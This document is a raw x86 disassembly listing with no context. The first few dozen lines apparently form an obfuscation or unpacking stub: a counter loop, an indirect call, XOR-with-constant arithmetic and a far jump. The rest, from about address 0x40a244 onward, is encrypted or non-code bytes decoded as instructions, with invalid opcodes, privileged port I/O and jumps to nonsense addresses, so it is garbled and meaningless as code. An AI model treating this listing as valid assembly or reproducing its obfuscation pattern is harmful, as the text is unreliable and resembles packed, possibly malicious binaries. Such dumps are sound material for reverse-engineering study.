  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a271
  40a251:	sbb    dl,BYTE PTR [esi+0x7c05d0f4]
  40a257:	jl     0x40a2a7
  40a259:	pop    edi
  40a25a:	jl     0x40a2d8
  40a25c:	xchg   esp,eax
  40a25d:	ret    
  40a25e:	(bad)  
  40a25f:	jmp    0xa14:0x649b8b38
  40a266:	inc    eax
  40a267:	cmp    eax,0xed18dd17
  40a26c:	aam    0x25
  40a26e:	shr    DWORD PTR [esi],cl
  40a270:	cmp    al,0xbb
  40a272:	sbb    al,cl
  40a274:	cmp    BYTE PTR [ebx+0x17a4f157],ch
  40a27a:	pop    esp
  40a27b:	pop    edx
  40a27c:	xchg   ah,bl
  40a27e:	lock cmp al,0x27
  40a281:	stos   DWORD PTR es:[edi],eax
  40a282:	sti    
  40a283:	ins    DWORD PTR es:[edi],dx
  40a284:	pusha  
  40a285:	or     BYTE PTR [esi],bl
  40a287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a288:	adc    dl,cl
  40a28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a28b:	xchg   ebp,eax
  40a28c:	pop    eax
  40a28d:	sub    esi,DWORD PTR [ebp-0x4d]
  40a290:	mov    ah,BYTE PTR [edi]
  40a292:	push   cs
  40a293:	ins    BYTE PTR es:[edi],dx
  40a294:	repz xor edi,DWORD PTR [edi]
  40a297:	mov    bh,0x5f
  40a299:	mov    al,dh
  40a29b:	mov    esi,0xf8cfec3a
  40a2a0:	add    ah,BYTE PTR [eax]
  40a2a2:	pushf  
  40a2a3:	push   0x2f
  40a2a5:	cmp    edi,DWORD PTR [ebp-0x769ca775]
  40a2ab:	in     al,dx
  40a2ac:	push   0xffffffbf
  40a2ae:	sub    edx,DWORD PTR [esi]
  40a2b0:	adc    esp,edi
  40a2b2:	fidiv  DWORD PTR [ebp+edx*1-0x63ce0f8d]
  40a2b9:	int3   
  40a2ba:	xchg   ebp,eax
  40a2bb:	xor    al,0x10
  40a2bd:	xor    dh,BYTE PTR [eax+ecx*8-0x253ff0]
  40a2c4:	in     al,0x72
  40a2c6:	lahf   
  40a2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2c8:	jge    0x40a2cc
  40a2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2cb:	test   DWORD PTR [edx+0x41],edi
  40a2ce:	sub    DWORD PTR [esi],ecx
  40a2d0:	cmp    edi,DWORD PTR [eax+0x3784ee84]
  40a2d6:	ss mov ah,0x4a
  40a2d9:	ja     0x40a2c3
  40a2db:	nop
  40a2dc:	mov    ch,BYTE PTR [esi+0x1338f6]
  40a2e2:	pusha  
  40a2e3:	adc    BYTE PTR [ebp+0x4b],0xaa
  40a2e7:	(bad)  [ebp-0x3a975727]
  40a2ed:	dec    edx
  40a2ee:	push   ebx
  40a2ef:	push   ds
  40a2f0:	cwde   
  40a2f1:	mov    eax,ds:0x576ab5df
  40a2f6:	out    dx,eax
  40a2f7:	cmp    edx,DWORD PTR cs:[edi]
  40a2fa:	(bad)  
  40a2fb:	jmp    0x40a328
  40a2fd:	mov    BYTE PTR [eax+0x1b],cl
  40a300:	stc    
  40a301:	xchg   edx,eax
  40a302:	stos   BYTE PTR es:[edi],al
  40a303:	adc    DWORD PTR [esi+edi*8-0x2035b9c8],eax
  40a30a:	cld    
  40a30b:	inc    ebx
  40a30c:	gs sahf 
  40a30e:	xlat   BYTE PTR ds:[ebx]
  40a30f:	dec    ebx
  40a310:	lds    ebp,FWORD PTR [esi-0x6]
  40a313:	sub    dl,BYTE PTR [edi]
  40a315:	and    BYTE PTR [ebx-0x11],bh
  40a318:	scas   eax,DWORD PTR es:[edi]
  40a319:	leave  
  40a31a:	scas   al,BYTE PTR es:[edi]
  40a31b:	add    eax,0x7284b0d6
  40a320:	inc    edx
  40a321:	test   DWORD PTR [edx-0x6c],ebp
  40a324:	adc    eax,0x1e420d55
  40a329:	inc    esi
  40a32a:	dec    edx
  40a32b:	xor    ah,dl
  40a32d:	fisubr DWORD PTR [ecx-0x1d]
  40a330:	mov    dl,0x6b
  40a332:	lods   eax,DWORD PTR ds:[esi]
  40a333:	data16 and al,0x87
  40a336:	ss add ecx,edx
  40a339:	repz lock mov eax,ds:0x3da82020
  40a340:	je     0x40a30c
  40a342:	add    dh,al
  40a344:	push   ecx
  40a345:	mov    al,0xd
  40a347:	xor    eax,0x465c4c90
  40a34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a34d:	sti    
  40a34e:	xlat   BYTE PTR ds:[ebx]
  40a34f:	fimul  WORD PTR [esi]
  40a351:	ja     0x40a3c7
  40a353:	repnz (bad) [edx-0x34]
  40a357:	je     0x40a3ba
  40a359:	adc    edi,DWORD PTR [ecx]
  40a35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a35c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a35d:	ss sbb al,0x39
  40a360:	mov    cs,WORD PTR [eax+0x2a]
  40a363:	iret   
  40a364:	inc    esp
  40a365:	push   ds
  40a366:	icebp  
  40a367:	test   DWORD PTR [ecx-0x6a],edx
  40a36a:	ret    0xb0e9
  40a36d:	les    esp,FWORD PTR [eax-0x30]
  40a370:	pushf  
  40a371:	les    esi,FWORD PTR [ebp-0x70]
  40a374:	ror    BYTE PTR [edx],cl
  40a376:	push   edi
  40a377:	mov    ebp,0x187667c8
  40a37c:	cmp    esp,ebx
  40a37e:	cmp    al,0x8
  40a380:	retf   0x83e
  40a383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a384:	dec    edx
  40a385:	imul   ebx,DWORD PTR [ebp+0x64],0x658346b0
  40a38c:	or     bl,bh
  40a38e:	cli    
  40a38f:	add    eax,0xb5130ff0
  40a394:	sbb    bl,BYTE PTR [edx]
  40a396:	out    0x54,eax
  40a398:	sub    eax,0xfffffff3
  40a39b:	mov    ds:0x6d0b30e0,al
  40a3a0:	call   0x908:0xccccbfa2
  40a3a7:	sub    dh,BYTE PTR [eax]
  40a3a9:	loope  0x40a3b6
  40a3ab:	bound  ebp,QWORD PTR [edi]
  40a3ad:	push   0x6bae902f
  40a3b2:	not    DWORD PTR [esi-0x7a899800]
  40a3b8:	enter  0xc9a1,0x73
  40a3bc:	pop    eax
  40a3bd:	push   ecx
  40a3be:	mov    esi,0xdc108cbd
  40a3c3:	xor    al,0x3e
  40a3c5:	pop    es
  40a3c6:	aas    
  40a3c7:	inc    eax
  40a3c8:	sti    
  40a3c9:	or     ecx,DWORD PTR [esi-0xc]
  40a3cc:	adc    al,0xd1
  40a3ce:	jp     0x40a3e1
  40a3d0:	out    0x0,eax
  40a3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d3:	aas    
  40a3d4:	push   0x62d88747
  40a3d9:	shr    BYTE PTR [eax],0x5d
  40a3dc:	ja     0x40a39b
  40a3de:	sbb    DWORD PTR [ebx+0xab4b505],esp
  40a3e4:	jge    0x40a428
  40a3e6:	inc    esp
  40a3e7:	shr    BYTE PTR [edx-0x47],cl
  40a3ea:	out    0xa1,al
  40a3ec:	xchg   esp,eax
  40a3ed:	sub    DWORD PTR [esi],0xfffffff2
  40a3f0:	or     BYTE PTR [edx],dl
  40a3f2:	sub    bh,al
  40a3f4:	call   0x25cccc27
  40a3f9:	test   eax,0x9eb5b0d3
  40a3fe:	add    bl,BYTE PTR [ecx+0x13]
  40a401:	cmp    ch,dl
  40a403:	push   0x7602a751
  40a408:	pop    ss
  40a409:	retf   
  40a40a:	fist   WORD PTR [esi-0x40e508b7]
  40a410:	and    al,0x19
  40a412:	clc    
  40a413:	mov    cl,0x58
  40a415:	mov    ebx,0x744fec30
  40a41a:	rsqrtps xmm0,XMMWORD PTR [edx-0x3bda71e1]
  40a421:	mov    DWORD PTR [esi],edx
  40a423:	adc    edx,DWORD PTR [esi+0x5b8ead0e]
  40a429:	jns    0x40a432
  40a42b:	pop    es
  40a42c:	fcomp  DWORD PTR [edi-0x38]
  40a42f:	retf   
  40a430:	inc    eax
  40a431:	ins    DWORD PTR es:[edi],dx
  40a432:	or     ebp,DWORD PTR [edi]
  40a434:	pop    ds
  40a435:	nop
  40a436:	into   
  40a437:	xchg   ebx,eax
  40a438:	lods   eax,DWORD PTR ds:[esi]
  40a439:	dec    eax
  40a43a:	inc    edx
  40a43b:	push   0xc5f5d23b
  40a440:	mov    dl,0xf2
  40a442:	mov    ecx,0xc2b51bbc
  40a447:	scas   eax,DWORD PTR es:[edi]
  40a448:	mov    ds:0xc69f6781,al
  40a44d:	xlat   BYTE PTR ds:[ebx]
  40a44e:	jecxz  0x40a48e
  40a450:	stos   BYTE PTR es:[edi],al
  40a451:	cmp    al,0x61
  40a453:	rol    DWORD PTR [eax+ebp*1+0x3e],0x92
  40a458:	inc    ebp
  40a459:	and    DWORD PTR [edx+0x290dec4b],edi
  40a45f:	xlat   BYTE PTR ds:[ebx]
  40a460:	mov    eax,0x966194e
  40a465:	cmp    edi,eax
  40a467:	(bad)  
  40a468:	xchg   esp,eax
  40a469:	push   ebp
  40a46a:	imul   ebp,DWORD PTR [edi],0x5fa94d32
  40a470:	xchg   DWORD PTR [esi+esi*4+0x21],eax
  40a474:	shl    BYTE PTR [ebx-0x276d7ce5],1
  40a47a:	pop    ebp
  40a47b:	je     0x40a4a1
  40a47d:	arpl   WORD PTR [edi],sp
  40a47f:	mov    cl,0xe5
  40a481:	pop    ecx
  40a482:	leave  
  40a483:	add    DWORD PTR [ebx],ebx
  40a485:	jnp    0x40a451
  40a487:	popf   
  40a488:	push   edx
  40a489:	sti    
  40a48a:	mov    ecx,0xd1ecbc7c
  40a48f:	or     DWORD PTR [ecx],esp
  40a491:	jg     0x40a416
  40a493:	mov    bl,0x56
  40a495:	and    cl,BYTE PTR [edi-0x20]
  40a498:	ja     0x40a476
  40a49a:	adc    ecx,esp
  40a49c:	mov    ah,0xc6
  40a49e:	repnz sbb al,0x38
  40a4a1:	xchg   DWORD PTR ds:0x6dfe0c23,edi
  40a4a7:	push   es
  40a4a8:	mov    ecx,0x78013d7f
  40a4ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4ae:	lods   al,BYTE PTR ds:[esi]
  40a4af:	cld    
  40a4b0:	push   ebx
  40a4b1:	test   eax,0xf03a2d2
  40a4b6:	call   0xcca:0xf534ac45
  40a4bd:	sub    eax,0xb5a76d4f
  40a4c2:	jl     0x40a517
  40a4c4:	jbe    0x40a460
  40a4c6:	pop    edi
  40a4c7:	xchg   esi,eax
  40a4c8:	dec    ebx
  40a4c9:	mov    BYTE PTR [edi],dh
  40a4cb:	xchg   edi,eax
  40a4cc:	mov    al,0x4f
  40a4ce:	mov    ds:0xd5fd6096,eax
  40a4d3:	jge    0x40a530
  40a4d5:	mov    ds:0x4ed4e1eb,al
  40a4da:	xlat   BYTE PTR ds:[ebx]
  40a4db:	xchg   esp,eax
  40a4dc:	dec    ebp
  40a4dd:	xchg   edi,eax
  40a4de:	aaa    
  40a4df:	stos   BYTE PTR es:[edi],al
  40a4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e1:	cmp    ecx,eax
  40a4e3:	sub    bl,ch
  40a4e5:	sbb    ebx,eax
  40a4e7:	xor    BYTE PTR [edx],al
  40a4e9:	(bad)  
  40a4ea:	cmp    bl,BYTE PTR [edi+edi*4]
  40a4ed:	aas    
  40a4ee:	outs   dx,DWORD PTR ds:[esi]
  40a4ef:	fwait
  40a4f0:	sub    al,0x22
  40a4f2:	or     BYTE PTR [edx+0x62],dl
  40a4f5:	jnp    0x40a4cc
  40a4f7:	pushf  
  40a4f8:	xor    BYTE PTR [esi],dh
  40a4fa:	mov    dh,0xa0
  40a4fc:	loope  0x40a48b
  40a4fe:	retf   
  40a4ff:	add    esp,0x1b61e1dd
  40a505:	ja     0x40a4bb
  40a507:	dec    eax
  40a508:	push   esi
  40a509:	lock xchg edi,eax
  40a50b:	scas   eax,DWORD PTR es:[edi]
  40a50c:	int3   
  40a50d:	or     eax,0x12e17fd0
  40a512:	retf   0x4d3f
  40a515:	cmc    
  40a516:	jae    0x40a4c9
  40a518:	fwait
  40a519:	loopne 0x40a4cf
  40a51b:	(bad)  
  40a51c:	icebp  
  40a51d:	xchg   ebp,eax
  40a51e:	jecxz  0x40a58a
  40a520:	or     eax,0x355e9a91
  40a525:	and    ebp,edx
  40a527:	fs loopne 0x40a51d
  40a52a:	cmp    esi,DWORD PTR [edx]
  40a52c:	sbb    al,0x84
  40a52e:	ror    esi,cl
  40a530:	sub    al,0xcb
  40a532:	sub    ch,al
  40a534:	mov    ch,0x7d
  40a536:	inc    edi
  40a537:	fnstenv [ebx]
  40a539:	push   edx
  40a53a:	xchg   ecx,eax
  40a53b:	cmp    al,0xec
  40a53d:	dec    BYTE PTR [esi]
  40a53f:	sbb    DWORD PTR [ecx+edi*1+0x49],esi
  40a543:	xchg   edx,eax
  40a544:	xlat   BYTE PTR ds:[ebx]
  40a545:	mov    al,0x86
  40a547:	sub    ah,BYTE PTR [edx-0x2c]
  40a54a:	cdq    
  40a54b:	jmp    0xfc75:0xd9c495ea
  40a552:	ror    ah,cl
  40a554:	stos   DWORD PTR es:[edi],eax
  40a555:	retf   
  40a556:	arpl   WORD PTR ds:0x5c2a7349,sp
  40a55c:	rcr    DWORD PTR ds:0xf74e807c,cl
  40a562:	jbe    0x40a5ba
  40a564:	xchg   ebx,eax
  40a565:	mov    edi,0x946f310a
  40a56a:	inc    ebp
  40a56b:	pop    esi
  40a56c:	pop    ecx
  40a56d:	pop    es
  40a56e:	or     edx,DWORD PTR [esi]
  40a570:	and    BYTE PTR [edx],ah
  40a572:	mov    al,BYTE PTR [esi]
  40a574:	and    DWORD PTR [ebx],ebx
  40a576:	add    esp,DWORD PTR [eax]
  40a578:	jecxz  0x40a4fb
  40a57a:	call   0x4ac4a21a
  40a57f:	xchg   edx,eax
  40a580:	jne    0x40a535
  40a582:	mov    al,0xa9
  40a584:	mov    ebp,0x91ceddce
  40a589:	gs mov al,0x6e
  40a58c:	neg    DWORD PTR [eax]
  40a58e:	mov    esi,0x2d2102ff
  40a593:	mov    esi,0xb64a8983
  40a598:	popf   
  40a599:	xchg   esp,eax
  40a59a:	push   edx
  40a59b:	jae    0x40a55e
  40a59d:	hlt    
  40a59e:	mov    esi,0x1bd28047
  40a5a3:	pop    esi
  40a5a4:	ja     0x40a61d
  40a5a6:	test   al,0x8f
  40a5a8:	in     eax,0x88
  40a5aa:	or     eax,DWORD PTR [eax+ebp*1]
  40a5ad:	in     al,0x2f
  40a5af:	scas   eax,DWORD PTR es:[edi]
  40a5b0:	mov    edi,0x3b4ccebc
  40a5b5:	xchg   ebx,eax
  40a5b6:	call   FWORD PTR [eax-0x32]
  40a5b9:	mov    bh,0x91
  40a5bb:	dec    edx
  40a5bc:	gs pop ebp
  40a5be:	int    0x57
  40a5c0:	and    ebp,DWORD PTR [esi]
  40a5c2:	jnp    0x40a5cd
  40a5c4:	data16 jae 0x40a5e7
  40a5c7:	test   al,0x1
  40a5c9:	ja     0x40a5bd
  40a5cb:	mov    cs,edx
  40a5cd:	ror    ecx,cl
  40a5cf:	aas    
  40a5d0:	stos   BYTE PTR es:[edi],al
  40a5d1:	xchg   esi,eax
  40a5d2:	push   ecx
  40a5d3:	retf   0x96d3
  40a5d6:	shl    dh,0xb3
  40a5d9:	mov    ah,0x61
  40a5db:	push   ebp
  40a5dc:	inc    edi
  40a5dd:	adc    ebx,DWORD PTR [esi+ecx*8+0x6c]
  40a5e1:	push   edx
  40a5e2:	dec    ebx
  40a5e3:	sar    DWORD PTR [eax],cl
  40a5e5:	jecxz  0x40a5ec
  40a5e7:	out    dx,al
  40a5e8:	iret   
  40a5e9:	xor    ecx,DWORD PTR [eax]
  40a5eb:	push   es
  40a5ec:	or     edi,DWORD PTR [ebp+0x5ccb0809]
  40a5f2:	mov    edx,0xc054a824
  40a5f7:	xchg   esp,eax
  40a5f8:	test   al,0x5b
  40a5fa:	dec    eax
  40a5fb:	gs jbe 0x40a5b5
  40a5fe:	imul   edi,DWORD PTR [esi-0x1c0237e2],0xfffffff3
  40a605:	cli    
  40a606:	jge    0x40a596
  40a608:	inc    ebx
  40a609:	inc    esi
  40a60a:	sar    eax,cl
  40a60c:	push   ecx
  40a60d:	mov    ebx,0xc74c28ca
  40a612:	outs   dx,DWORD PTR ds:[esi]
  40a613:	sbb    DWORD PTR [edi-0x78f1e20e],0xca0fd561
  40a61d:	cdq    
  40a61e:	gs xchg ebp,eax
  40a620:	xchg   edx,eax
  40a621:	fbld   TBYTE PTR [eax-0x37bc2bec]
  40a627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a628:	or     al,0x3f
  40a62a:	not    DWORD PTR [edx-0x2b]
  40a62d:	xchg   DWORD PTR [ecx+0x1fcb78d7],edi
  40a633:	sahf   
  40a634:	clc    
  40a635:	jg     0x40a61a
  40a637:	xor    BYTE PTR [ecx-0x74f806d],al
  40a63d:	jns    0x40a62b
  40a63f:	lods   eax,DWORD PTR ds:[esi]
  40a640:	aas    
  40a641:	mov    esi,DWORD PTR [ebx]
  40a643:	aaa    
  40a644:	mov    esi,0x6ab9325c
  40a649:	cmp    BYTE PTR [edi+esi*2],bh
  40a64c:	pop    esi
  40a64d:	call   0x5c4c7408
  40a652:	xor    DWORD PTR [esi],esi
  40a654:	imul   ecx,DWORD PTR [ecx],0xffffffcd
  40a657:	out    0x42,eax
  40a659:	stos   DWORD PTR es:[edi],eax
  40a65a:	mov    edi,?
  40a65c:	gs (bad) 
  40a65e:	in     al,0x6
  40a660:	mov    ebx,0xf02a5c4e
  40a665:	jg     0x40a658
  40a667:	inc    ecx
  40a668:	fld    DWORD PTR [edx-0x34]
  40a66b:	sub    eax,0xffb2feb8
  40a670:	ss sub ch,bl
  40a673:	dec    eax
  40a674:	pop    es
  40a675:	push   edi
  40a676:	mov    DWORD PTR [edi+0xa],edi
  40a679:	cwde   
  40a67a:	out    dx,eax
  40a67b:	mov    ah,ch
  40a67d:	cmp    BYTE PTR [edx+0x42b34c78],al
  40a683:	es push ds
  40a685:	fsubr  QWORD PTR [esi]
  40a687:	(bad)  ds:0xeaa61c1a
  40a68d:	dec    edx
  40a68e:	test   DWORD PTR [eax+0x42],ebx
  40a691:	cld    
  40a692:	or     edx,edx
  40a694:	rol    bl,cl
  40a696:	std    
  40a697:	mov    ch,0x75
  40a699:	retf   0x2181
  40a69c:	in     eax,0xa
  40a69e:	ds es call 0x1b3c48db
  40a6a5:	xor    DWORD PTR [ebp-0x78],esi
  40a6a8:	loopne 0x40a6db
  40a6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ab:	shl    ebx,cl
  40a6ad:	lock and BYTE PTR ds:0x3197910f,al
  40a6b4:	fmul   st(0),st
  40a6b6:	mov    ecx,ebx
  40a6b8:	fisttp WORD PTR [edx+0x3d]
  40a6bb:	inc    ebx
  40a6bc:	mov    BYTE PTR [eax],dh
  40a6be:	cli    
  40a6bf:	dec    esi
  40a6c0:	sub    ebp,ebx
  40a6c2:	gs jg  0x40a677
  40a6c5:	cli    
  40a6c6:	imul   edx,ecx,0x52005334
  40a6cc:	sbb    cl,BYTE PTR [edi]
  40a6ce:	outs   dx,DWORD PTR ds:[esi]
  40a6cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6d0:	add    BYTE PTR [eax+ecx*2-0x36],ah
  40a6d4:	push   0x6a
  40a6d6:	xor    BYTE PTR [edx+0x31],0x55
  40a6da:	int3   
  40a6db:	aad    0x76
  40a6dd:	in     al,0xb8
  40a6df:	pop    es
  40a6e0:	fdivp  st(2),st
  40a6e2:	loopne 0x40a707
  40a6e4:	cmp    eax,0x9a9f38c4
  40a6e9:	push   ebp
  40a6ea:	adc    ecx,esp
  40a6ec:	arpl   WORD PTR [ebx-0x1dc9636b],bx
  40a6f2:	rcl    BYTE PTR [eax+ebp*4+0x75],1
  40a6f6:	pop    edx
  40a6f7:	or     al,0xed
  40a6f9:	dec    esi
  40a6fa:	and    ecx,edx
  40a6fc:	aas    
  40a6fd:	dec    ecx
  40a6fe:	jp     0x40a77c
  40a700:	fs sahf 
  40a702:	test   eax,0xc6375d4a
  40a707:	push   ebx
  40a708:	and    ebx,eax
  40a70a:	call   0x1b213b3d
  40a70f:	mov    esp,0xcfd79a2
  40a714:	mov    ds:0xef150b0d,eax
  40a719:	cmp    al,0x6d
  40a71b:	outs   dx,DWORD PTR ds:[esi]
  40a71c:	and    al,0xd2
  40a71e:	ja     0x40a6ed
  40a720:	aad    0x31
  40a722:	inc    ebx
  40a723:	dec    edx
  40a724:	xchg   ebp,eax
  40a725:	xchg   esi,eax
  40a726:	ror    DWORD PTR [edi-0x2d],1
  40a729:	sub    ecx,esp
  40a72b:	xor    eax,0x4227412b
  40a730:	fist   DWORD PTR [ebx]
  40a732:	sbb    eax,0xd2e994c8
  40a737:	dec    ecx
  40a738:	div    DWORD PTR ds:0xb3b641d3
  40a73e:	ds daa 
  40a740:	inc    eax
  40a741:	out    dx,eax
  40a742:	or     ah,BYTE PTR [ebx+0x48a313]
  40a748:	xchg   ebp,eax
  40a749:	xchg   ebx,eax
  40a74a:	inc    ebx
  40a74b:	daa    
  40a74c:	and    al,0x90
  40a74e:	shl    DWORD PTR [ecx-0x748baeae],cl
  40a754:	cmp    DWORD PTR ds:0xee488da9,edi
  40a75a:	sub    al,0x2c
  40a75c:	in     al,0xe2
  40a75e:	pop    ebp
  40a75f:	xor    bh,BYTE PTR [ebx-0x6e0ceab7]
  40a765:	push   0x12
  40a767:	mov    ebp,0x61e155b2
  40a76c:	cli    
  40a76d:	or     DWORD PTR [ebp+0x4d50a176],0xffffff99
  40a774:	pop    esp
  40a775:	adc    BYTE PTR [ebx+ecx*2+0x7d381d4d],bh
  40a77c:	retf   0x2d77
  40a77f:	and    edi,DWORD PTR [ebx-0xe]
  40a782:	inc    edx
  40a783:	fld    TBYTE PTR [ebx]
  40a785:	hlt    
  40a786:	mov    ds,WORD PTR [ebx]
  40a788:	cmp    al,0x36
  40a78a:	push   esp
  40a78b:	mov    ebp,0xa2de2ccc
  40a790:	sbb    DWORD PTR [edx],esi
  40a792:	out    dx,al
  40a793:	mov    al,0xe8
  40a795:	cmp    al,0xa7
  40a797:	js     0x40a72e
  40a799:	rol    BYTE PTR [eax-0x46],1
  40a79c:	jle    0x40a7d3
  40a79e:	mov    dh,0xfd
  40a7a0:	(bad)  
  40a7a1:	jo     0x40a763
  40a7a3:	sbb    eax,0x6a954fc4
  40a7a8:	dec    ecx
  40a7a9:	xchg   edx,eax
  40a7aa:	mov    cl,0x65
  40a7ac:	push   ebp
  40a7ad:	es mov al,0x89
  40a7b0:	mov    eax,ds:0xc72bf8f7
  40a7b5:	call   0x4782fc3e
  40a7ba:	dec    edx
  40a7bb:	jo     0x40a7c1
  40a7bd:	inc    esi
  40a7be:	xchg   esi,eax
  40a7bf:	retf   0x30fe
  40a7c2:	jmp    0x40a766
  40a7c4:	push   edx
  40a7c5:	dec    ebx
  40a7c6:	push   cs
  40a7c7:	adc    ebx,DWORD PTR [edx]
  40a7c9:	dec    esp
  40a7ca:	in     eax,dx
  40a7cb:	xchg   edi,eax
  40a7cc:	cmp    eax,ecx
  40a7ce:	or     al,BYTE PTR [ecx]
  40a7d0:	mov    al,ds:0x87bce43d
  40a7d5:	in     al,dx
  40a7d6:	jle    0x40a7c3
  40a7d8:	stos   DWORD PTR es:[edi],eax
  40a7d9:	add    eax,0x39da8d73
  40a7de:	lea    eax,[esi-0x1]
  40a7e1:	les    edi,FWORD PTR [edx+0x70245eb]
  40a7e7:	cmp    esp,ebp
  40a7e9:	mov    eax,0x62f4e8c2
  40a7ee:	or     al,0x4f
  40a7f0:	aaa    
  40a7f1:	lea    edx,[edx-0x57]
  40a7f4:	inc    esp
  40a7f5:	lds    ecx,FWORD PTR [ebx+0x70]
  40a7f8:	cmp    eax,DWORD PTR [esi+0x4]
  40a7fb:	mov    esp,0x2833bb61
  40a800:	stc    
  40a801:	mov    esi,0x2bf48f77
  40a806:	xor    dl,BYTE PTR [esi+0x4a]
  40a809:	(bad)  
  40a80a:	jne    0x40a7ae
  40a80c:	push   edi
  40a80d:	mov    dh,0x4d
  40a80f:	xchg   ebx,eax
  40a810:	jl     0x40a7f6
  40a812:	js     0x40a81e
  40a814:	push   ss
  40a815:	(bad)  
  40a816:	pop    eax
  40a817:	mov    eax,0x30c29f82
  40a81c:	pop    edx
  40a81d:	lds    esi,FWORD PTR gs:[esi-0x1b]
  40a821:	fisub  WORD PTR [ebp-0xa]
  40a824:	dec    eax
  40a825:	mov    edi,0x36788fd5
  40a82a:	(bad)  
  40a82b:	daa    
  40a82c:	dec    esi
  40a82d:	int3   
  40a82e:	push   ebp
  40a82f:	adc    BYTE PTR [ebp-0x19],al
  40a832:	(bad)  
  40a833:	pop    ebp
  40a834:	sahf   
  40a835:	push   ss
  40a836:	sub    ch,BYTE PTR [ebx*4+0x45ff1975]
  40a83d:	jae    0x40a8b3
  40a83f:	les    ebp,FWORD PTR [edx+ebx*4-0x41a64b67]
  40a846:	jmp    0x6a99a75b
  40a84b:	xor    BYTE PTR [eax-0x50],0x42
  40a84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a850:	loope  0x40a8b0
  40a852:	mov    eax,0x21b9eaec
  40a857:	sub    al,0x25
  40a859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a85a:	mov    esi,0x62a55664
  40a85f:	pop    ebx
  40a860:	dec    edx
  40a861:	xor    eax,DWORD PTR [ebp-0x3c]
  40a864:	ins    BYTE PTR es:[edi],dx
  40a865:	in     eax,dx
  40a866:	ss (bad) 
  40a868:	retf   
  40a869:	lods   al,BYTE PTR ds:[esi]
  40a86a:	push   0xe9e55c76
  40a86f:	cs popf 
  40a871:	and    DWORD PTR [edx],0xb3923d74
  40a877:	xchg   edi,eax
  40a878:	cmp    ebx,DWORD PTR ds:0x5ee8b5f0
  40a87e:	jl     0x40a84a
  40a880:	sbb    eax,0xe99ea61b
  40a885:	xchg   esi,eax
  40a886:	loope  0x40a815
  40a888:	retf   
  40a889:	pusha  
  40a88a:	push   esi
  40a88b:	cmp    eax,0x5eafc66f
  40a890:	pop    es
  40a891:	fiadd  WORD PTR [esi+0x12]
  40a894:	enter  0x85ed,0xda
  40a898:	imul   ebp,DWORD PTR [ecx+0x77],0xffffffc1
  40a89c:	into   
  40a89d:	shl    esp,0x3f
  40a8a0:	fisub  WORD PTR [ebx-0x4]
  40a8a3:	cs into 
  40a8a5:	and    eax,0x69fb7590
  40a8aa:	xchg   ebp,eax
  40a8ab:	nop
  40a8ac:	dec    esi
  40a8ad:	scas   al,BYTE PTR es:[edi]
  40a8ae:	ror    bh,1
  40a8b0:	mov    ch,0xf
  40a8b2:	mov    DWORD PTR [ecx],edx
  40a8b4:	or     esi,DWORD PTR [edi]
  40a8b6:	(bad)  
  40a8b9:	push   0x45bb3a8
  40a8be:	push   ds
  40a8bf:	mov    bl,0x86
  40a8c1:	mov    dl,0x1d
  40a8c3:	rcr    ebx,0xc6
  40a8c6:	popa   
  40a8c7:	shr    ebx,0xb7
  40a8ca:	cs mov ebp,0x1b8f835c
  40a8d0:	lods   eax,DWORD PTR ds:[esi]
  40a8d1:	cdq    
  40a8d2:	xor    ebp,DWORD PTR [esi-0x53]
  40a8d5:	xchg   esi,eax
  40a8d6:	popf   
  40a8d7:	sub    BYTE PTR [bp+di],0xd
  40a8db:	shr    BYTE PTR ds:0x71d00dd9,cl
  40a8e1:	mov    ?,WORD PTR [esi]
  40a8e3:	inc    esi
  40a8e4:	jle    0x40a8d0
  40a8e6:	jl     0x40a888
  40a8e8:	push   cs
  40a8e9:	out    0xee,al
